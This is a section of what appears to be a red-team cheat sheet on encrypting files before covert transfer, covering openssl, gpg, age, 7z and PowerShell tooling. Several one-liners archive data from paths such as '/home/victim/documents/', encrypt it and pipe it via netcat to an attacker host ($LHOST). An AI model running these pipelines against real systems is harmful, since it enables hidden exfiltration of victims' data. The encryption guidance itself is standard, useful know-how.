# 11 - Encrypting a File Before Transfer

> [← README](../../README.md) · [Next section →](12-dns-icmp.md)

The goal: the file travels over someone else's channel and is useless without the password/key.

**Order:** `tar/zip -> encrypt -> base64 (if the channel is text-only) -> transfer -> sha256`.

```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
export PASS='MyStr0ngP@ssphrase!2026'
```

## Quick selection

| Situation | Tool |
|---|---|
| Need a password, openssl is everywhere | `openssl enc` |
| Need proper authentication | `age` / `gpg` |
| Archive + hide file names | `7z -mhe=on` |
| Recipient's public key | `gpg -e` / `age -r` |
| Text channel (email, DNS, chat) | `-base64` / `-a` |
| Windows with nothing installed | PowerShell AES / 7-Zip / Gpg4win |
| Many files | `tar czf - dir/` -> `age` / `gpg` |

> `zip -e` (ZipCrypto), ECB, and `openssl enc` without a MAC are not for real secrets. Send the password over a **different channel**.

## Block cipher modes

| Mode | When | Downside |
|---|---|---|
| ECB | never | identical blocks = identical ciphertext |
| CBC | legacy systems, `openssl enc` | needs an IV, no built-in MAC |
| CTR | streaming data | no MAC, nonce reuse is a disaster |
| GCM | default for new work | needs a unique nonce |

> For files it's more practical not to pick a mode by hand but to use `age` (ChaCha20-Poly1305) or `gpg`.

---

# 🐧Linux

## Preparing the archive

```bash
# a single file or a directory
tar czf data.tar.gz secret.zip
tar czf data.tar.gz /home/victim/documents/

# hash before encryption
sha256sum data.tar.gz > data.sha256
```

## openssl enc (quick, password-based)

```bash
# encrypt
openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt \
  -in data.tar.gz -out data.enc

# decrypt
openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 \
  -in data.enc -out data.tar.gz
```

```bash
# password from a variable so it doesn't show up in ps
PASS='MyStr0ngP@ssphrase!2026' openssl enc -aes-256-cbc -pbkdf2 -iter 100000 \
  -salt -pass env:PASS -in data.tar.gz -out data.enc

# password from a file
openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt \
  -pass file:/tmp/key.txt -in data.tar.gz -out data.enc
```

**For a text channel, go straight to base64:**

```bash
openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -base64 \
  -in data.tar.gz -out data.enc.b64

openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -base64 \
  -in data.enc.b64 -out data.tar.gz
```

**One-liner over netcat:**

```bash
# RHOST -> LHOST
tar czf - secret.zip | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -base64 | nc $LHOST 4444

# LHOST
nc -lvnp 4444 | openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -base64 | tar xzf -
```

> `openssl enc` with CBC **does not verify integrity**. The password or the data can be swapped without anyone noticing. For anything important use `gpg` or `age`.

## gpg: symmetric (one password)

```bash
# encrypt (prompts for the password)
gpg --symmetric --cipher-algo AES256 --s2k-digest-algo SHA512 \
  --s2k-count 65011712 --output data.tar.gz.gpg data.tar.gz

# decrypt
gpg --decrypt --output data.tar.gz data.tar.gz.gpg

# text channel: ASCII armor
gpg --symmetric --armor --cipher-algo AES256 --output data.asc data.tar.gz
gpg --decrypt --output data.tar.gz data.asc
```

**Non-interactive (password in a file):**

```bash
chmod 600 pass.txt
gpg --batch --yes --pinentry-mode loopback --passphrase-file pass.txt \
  --symmetric --cipher-algo AES256 --output data.gpg data.tar.gz

gpg --batch --yes --pinentry-mode loopback --passphrase-file pass.txt \
  --output data.tar.gz --decrypt data.gpg
```

**Password from stdin:**

```bash
printf '%s' "$PASS" | gpg --batch --yes --pinentry-mode loopback --passphrase-fd 0 \
  --symmetric --cipher-algo AES256 --output data.gpg data.tar.gz
```

## gpg: asymmetric (public key)

```bash
# 1. Key: ed25519 signing + cv25519 encryption
gpg --quick-generate-key "Alice <alice@example.com>" ed25519 sign 2y
FPR=$(gpg --list-keys --with-colons | awk -F: '/^fpr:/ {print $10; exit}')
gpg --quick-add-key "$FPR" cv25519 encr 2y

# 2. Hand over the public key
gpg --armor --export alice@example.com > alice.pub.asc

# 3. The recipient imports it and verifies the fingerprint
gpg --import alice.pub.asc
gpg --fingerprint alice@example.com

# 4. Trust (in the interactive menu: trust -> 5 -> y -> quit)
gpg --edit-key alice@example.com

# 5. Encrypt / decrypt
gpg --encrypt --recipient alice@example.com --output data.gpg data.tar.gz
gpg --decrypt --output data.tar.gz data.gpg

# 6. Sign and verify
gpg --detach-sign --armor data.tar.gz
gpg --verify data.tar.gz.asc data.tar.gz

# 7. Encrypt + sign
gpg --encrypt --sign --recipient alice@example.com --local-user me@example.com \
  --output data.gpg data.tar.gz
```

**Look inside:**

```bash
gpg --list-packets data.gpg
# shows the algorithm, key id, mdc/aead
```

## age (simple, authenticated)

```bash
sudo apt install -y age

# keys
age-keygen -o key.txt          # the public key is printed to stderr
cat key.txt

# encrypt to the recipient
age -r age1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx \
  -o data.tar.gz.age data.tar.gz

# decrypt
age -d -i key.txt -o data.tar.gz data.tar.gz.age

# with a password
age -p -o data.tar.gz.age data.tar.gz
age -d -o data.tar.gz data.tar.gz.age

# text channel
age -p -a -o data.asc data.tar.gz
```

## 7z

```bash
# archive + AES-256 + hidden file names
7z a -p'P@ssw0rd' -mhe=on -mx=9 data.7z data.tar.gz
7z a -p'P@ssw0rd' -mhe=on -mx=9 data.7z /home/victim/documents/

# extract
7z x data.7z -o./out
```

---

# 🪟Windows

## 7-Zip

```powershell
winget install --id 7zip.7zip -e
# or choco install 7zip
```

```cmd
"C:\Program Files\7-Zip\7z.exe" a -p"P@ssw0rd" -mhe=on -mx=9 out.7z C:\Users\Public\secrets.zip
"C:\Program Files\7-Zip\7z.exe" x out.7z -oD:\extracted
```

## Gpg4win

```powershell
winget install --id GnuPG.Gpg4win -e
gpg --version
```

```powershell
# symmetric
gpg --symmetric --cipher-algo AES256 --output .\file.gpg .\file
gpg --decrypt --output .\file .\file.gpg

# asymmetric
gpg --encrypt --recipient alice@example.com --output .\file.gpg .\file
gpg --decrypt --output .\file .\file.gpg
```

> In PowerShell don't use `>` to decrypt - it mangles binary data. Use `--output` only.

## PowerShell AES (no install)

The script is published by its author as a gist: [`ddumicz/Invoke-AESEncryption.ps1`](https://gist.github.com/ddumicz/909d98a0e794a42326d5fcd6d9f2c4ad). It is **not** bundled with this repository. Download it to Windows over any channel (save it as `Invoke-AESEncryption.ps1`), then import it:

```powershell
Set-ExecutionPolicy -Scope Process Bypass -Force
Import-Module .\Invoke-AESEncryption.ps1
```

```powershell
# file
Invoke-AESEncryption -Mode Encrypt -Key "MyStr0ngP@ssw0rd!2024" -Path "C:\Temp\secrets.zip"
Invoke-AESEncryption -Mode Decrypt -Key "MyStr0ngP@ssw0rd!2024" -Path "C:\Temp\secrets.zip.aes"

# string
Invoke-AESEncryption -Mode Encrypt -Key "MyStr0ngP@ssw0rd!2024" -Text "secret text"
Invoke-AESEncryption -Mode Decrypt -Key "MyStr0ngP@ssw0rd!2024" -Text "...."
```

> The script uses CBC without a MAC. For an exact round-trip of binaries, change `PaddingMode::Zeros` to `PKCS7` on both sides. The gist does not state a license: treat it as third-party code and check with the author before redistributing (see the Credits section in [README.md](../../README.md#credits)).

## CMS (PKCS#7, only if you have a certificate)

```powershell
Get-ChildItem Cert:\CurrentUser\My -DocumentEncryptionCert

Protect-CmsMessage -To "<thumbprint>" -Path C:\Temp\secrets.txt -OutFile C:\Temp\secrets.cms
Unprotect-CmsMessage -Path C:\Temp\secrets.cms -To "<thumbprint>" | Set-Content C:\Temp\secrets.txt
```

## certutil (encoding, not encryption)

```cmd
certutil -encode file.bin file.b64
certutil -decode file.b64 file.bin
certutil -hashfile file.bin SHA256
```

---

# Integrity verification

```bash
# Linux
sha256sum data.tar.gz > data.sha256
sha256sum -c data.sha256
```

```powershell
# Windows
Get-FileHash C:\Temp\data.tar.gz -Algorithm SHA256
certutil -hashfile C:\Temp\data.tar.gz SHA256
```

> A `sha256` file next to the data protects against accidental corruption, but **not against an attacker**: they can replace both the file and the hash. To catch tampering you need a MAC/AEAD (`age`, `gpg`) or a signature.

---

# Ready-made transfer recipes

## Text channel (email, chat, DNS)

```bash
# sender: archive -> age -> base64
tar czf - secret.zip | age -p -a | base64 -w0 > payload.txt

# recipient
base64 -d payload.txt | age -d | tar xzf -
```

```bash
# the same via gpg
tar czf - secret.zip | gpg -c --armor | base64 -w0 > payload.txt
base64 -d payload.txt | gpg -d | tar xzf -
```

## Binary channel (nc, /dev/tcp, HTTP)

```bash
# sender
tar czf - secret.zip | age -p | nc $LHOST 4444

# recipient
nc -lvnp 4444 | age -d | tar xzf -
```

> If `age -p` gets in the way in a pipeline, use `age -r <public_key>`.

## Large file in chunks

```bash
# split
split -b 5M data.enc.b64 part_

# reassemble
cat part_* > data.enc.b64
base64 -d data.enc.b64 > data.enc
```

---

# When it doesn't work

| Error | Cause | Fix |
|---|---|---|
| `bad decrypt` | wrong password / different algorithm / forgot `-base64` | check the password and every flag |
| `wrong final block length` | file truncated or it's the wrong format | compare the size/`sha256` |
| `gpg: decryption failed: No secret key` | the file wasn't encrypted to your key | check `--recipient` / `--list-packets` |
| `gpg: public key decryption failed` | private key missing | import the key, check `--list-secret-keys` |
| `There is no assurance this key belongs...` | key has no trust level set | `gpg --edit-key` -> `trust` |
| PowerShell: file corrupt after `>` | PowerShell changes the encoding/bytes | use `--output` |
| `age: identity file not found` | wrong key path | `-i /path/key.txt` |
| `7z: Wrong password` | wrong password / broken archive | check the password, `7z t data.7z` |
| `tar: Unexpected EOF` | transfer was cut short | finish the download, verify `sha256` |

**Mini checklist:** archive -> cipher -> base64 (if text) -> transfer -> `sha256` -> decrypt -> `tar tzf`/`unzip -t`.

---

[← Back to the index](../../README.md)
